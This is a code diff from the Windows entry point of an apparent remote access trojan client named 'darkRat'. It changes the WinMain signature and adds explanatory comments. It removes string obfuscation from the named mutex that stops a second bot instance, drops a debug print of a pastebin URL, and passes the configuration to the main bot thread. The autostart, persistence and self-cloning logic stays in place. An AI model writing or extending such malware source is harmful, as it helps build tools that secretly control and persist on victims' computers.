@@ -46,18 +46,22 @@ struct ComInit
 int main(int argc, char* argv[]) {
 #endif
 #if NDEBUG 
-int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
+int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is the "handle" to YOUR PROGRAM ITSELF.
+		HINSTANCE hPrevInstance,// USELESS on modern windows (totally ignore hPrevInstance)
+		LPSTR szCmdLine,        // Command line arguments.  similar to argv in standard C programs
+		int iCmdShow){
 #endif
 		darkRat::config::config config = darkRat::config::load();
 		//Config config;
 		std::thread darkMain;
-
+		
 		//Check if the Bot is Running
-		std::string mutex = OBFUSCATE("Local\\") + config.mutex;
+		std::string mutex = "Local\\" + config.mutex;
 		CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
 		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
 			return -1; // quit; mutex is released automatically
-
+		
+	
 		//Autostart  (with persistence) && Clone
 		if (config.startup == "true") {
 			std::string insatlled = Helpers::installedOrnot();
@@ -65,15 +69,10 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 				return 0;
 			}
 		}
+		
 
-		std::cout << " WTF:" << config.pastebinUrl << std::endl;
-		//system("pause");
-		darkMain = std::thread(Client::darkMainThread);
+		darkMain = std::thread(Client::darkMainThread, config);
 		darkMain.join();
-		/*
-		while (true)
-		{
-			Sleep(1000000);
-		}
-		*/
+
+		
 }
